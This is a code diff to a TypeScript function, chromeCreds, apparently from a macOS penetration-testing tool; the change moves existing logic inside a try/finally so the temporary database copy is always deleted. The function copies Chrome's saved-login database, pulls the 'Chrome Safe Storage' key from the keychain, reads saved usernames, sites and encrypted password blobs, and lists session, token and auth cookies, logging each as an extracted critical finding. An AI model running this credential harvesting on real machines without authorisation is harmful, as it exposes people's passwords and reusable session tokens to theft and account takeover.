@@ -100,66 +100,68 @@ export async function chromeCreds(args: string[], timeout: number): Promise<Hook
     const exists = await Bun.file(loginDb).exists()
     if (exists) {
       const tmpDb = `/tmp/cs-chrome-login-${Date.now()}.db`
-      await run("cp", [loginDb, tmpDb], timeout)
+      try {
+        await run("cp", [loginDb, tmpDb], timeout)
 
-      const safeKey = await run("security", ["find-generic-password", "-s", "Chrome Safe Storage", "-w"], timeout)
-      if (safeKey.exitCode === 0) {
-        output.push(`[+] Chrome Safe Storage key retrieved`)
-      }
-
-      const rows = await run(
-        "sqlite3",
-        [
-          tmpDb,
-          "-json",
-          "SELECT origin_url, username_value, hex(password_value) as pw_hex FROM logins WHERE username_value != '' LIMIT 100",
-        ],
-        timeout,
-      )
-      if (rows.exitCode === 0) {
-        const entries = JSON.parse(rows.stdout || "[]") as Array<Record<string, string>>
-        output.push(`[+] Chrome saved passwords: ${entries.length}`)
-        for (const e of entries) {
-          output.push(
-            `    URL: ${e.origin_url}  User: ${e.username_value}  (encrypted blob: ${(e.pw_hex || "").length / 2} bytes)`,
-          )
-          findings.push({
-            checkId: `MAC-CHROME-${findings.length + 1}`,
-            provider: "macos",
-            severity: "critical",
-            status: "EXTRACTED",
-            resource: e.origin_url,
-            title: `Chrome credential: ${e.username_value}@${e.origin_url}`,
-            details: `Username: ${e.username_value}, encrypted password blob present`,
-            remediation: "Rotate password for this site after engagement",
-          })
+        const safeKey = await run("security", ["find-generic-password", "-s", "Chrome Safe Storage", "-w"], timeout)
+        if (safeKey.exitCode === 0) {
+          output.push(`[+] Chrome Safe Storage key retrieved`)
         }
-      }
 
-      const cookies = await run(
-        "sqlite3",
-        [
-          `${home}/Library/Application Support/Google/Chrome/Default/Cookies`,
-          "-json",
-          "SELECT host_key, name, hex(encrypted_value) as val_hex FROM cookies ORDER BY last_access_utc DESC LIMIT 50",
-        ],
-        timeout,
-      )
-      if (cookies.exitCode === 0) {
-        const entries = JSON.parse(cookies.stdout || "[]") as Array<Record<string, string>>
-        output.push(`[+] Chrome cookies: ${entries.length} (session tokens may be reusable)`)
-        for (const e of entries) {
-          if (
-            e.name.toLowerCase().includes("session") ||
-            e.name.toLowerCase().includes("token") ||
-            e.name.toLowerCase().includes("auth")
-          ) {
-            output.push(`    [!] Sensitive cookie: ${e.host_key} — ${e.name}`)
+        const rows = await run(
+          "sqlite3",
+          [
+            tmpDb,
+            "-json",
+            "SELECT origin_url, username_value, hex(password_value) as pw_hex FROM logins WHERE username_value != '' LIMIT 100",
+          ],
+          timeout,
+        )
+        if (rows.exitCode === 0) {
+          const entries = JSON.parse(rows.stdout || "[]") as Array<Record<string, string>>
+          output.push(`[+] Chrome saved passwords: ${entries.length}`)
+          for (const e of entries) {
+            output.push(
+              `    URL: ${e.origin_url}  User: ${e.username_value}  (encrypted blob: ${(e.pw_hex || "").length / 2} bytes)`,
+            )
+            findings.push({
+              checkId: `MAC-CHROME-${findings.length + 1}`,
+              provider: "macos",
+              severity: "critical",
+              status: "EXTRACTED",
+              resource: e.origin_url,
+              title: `Chrome credential: ${e.username_value}@${e.origin_url}`,
+              details: `Username: ${e.username_value}, encrypted password blob present`,
+              remediation: "Rotate password for this site after engagement",
+            })
           }
         }
-      }
 
-      await run("rm", ["-f", tmpDb], timeout)
+        const cookies = await run(
+          "sqlite3",
+          [
+            `${home}/Library/Application Support/Google/Chrome/Default/Cookies`,
+            "-json",
+            "SELECT host_key, name, hex(encrypted_value) as val_hex FROM cookies ORDER BY last_access_utc DESC LIMIT 50",
+          ],
+          timeout,
+        )
+        if (cookies.exitCode === 0) {
+          const entries = JSON.parse(cookies.stdout || "[]") as Array<Record<string, string>>
+          output.push(`[+] Chrome cookies: ${entries.length} (session tokens may be reusable)`)
+          for (const e of entries) {
+            if (
+              e.name.toLowerCase().includes("session") ||
+              e.name.toLowerCase().includes("token") ||
+              e.name.toLowerCase().includes("auth")
+            ) {
+              output.push(`    [!] Sensitive cookie: ${e.host_key} — ${e.name}`)
+            }
+          }
+        }
+      } finally {
+        await run("rm", ["-f", tmpDb], timeout)
+      }
     }
   }
 
